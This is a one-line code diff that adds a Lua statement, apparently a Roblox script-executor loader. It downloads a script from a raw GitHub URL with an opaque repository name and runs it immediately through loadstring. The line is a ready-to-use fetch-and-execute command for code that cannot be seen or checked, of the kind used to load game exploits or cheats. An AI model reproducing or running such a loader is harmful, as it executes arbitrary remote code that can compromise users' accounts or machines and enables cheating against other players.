@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/oShyyyyy/we4rtrthrrtrttyrtyrty/main/Arabic%20Fornite'))()
